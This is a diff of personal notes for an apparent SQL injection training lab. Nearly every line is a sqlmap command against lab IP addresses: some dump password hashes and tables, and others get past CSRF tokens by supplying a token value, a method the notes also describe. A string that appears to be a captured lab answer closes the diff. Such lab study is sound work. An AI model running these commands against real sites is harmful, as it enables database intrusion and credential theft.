@@ -172,10 +172,8 @@ What's the Kimberly user's password? (Case #1)
 sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --passwords --batch --dump
 sqlmap -u "http://165.22.126.213:32170/case8.php" -randomize=rp --batch -v 5 | grep URI
 What's the contents of table flag8? (Case #8)
-sqlmap -u "http://165.22.126.213:32170/case8.php" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
-sqlmap -u "http://165.22.126.213:32170/case8.php/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
-sqlmap -u "http://159.65.49.148:30071/case8.php?id=1" --data="id=1&csrf-token=enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU" --csrf-token="t0ken"
-<input type="hidden" name="t0ken" value="enaUUhY2BFvZKWef2T9Pu6tFnfzde39JyiQvcLCDcU">
+get token name and value via browser > network > requests.
+sqlmap -u "http://178.128.163.230:31018/case8.php" --data="id=1&t0ken=Af1394DLz9Q2HfMDehREVTpjL6jlULjqLCrM2UO4vY" --csrf-token="t0ken" --batch --dump
 
 7F4DA0C0j5OW2hdOZ2ec65wGMFj0Qp0ub3pfpU0ZwQ
 
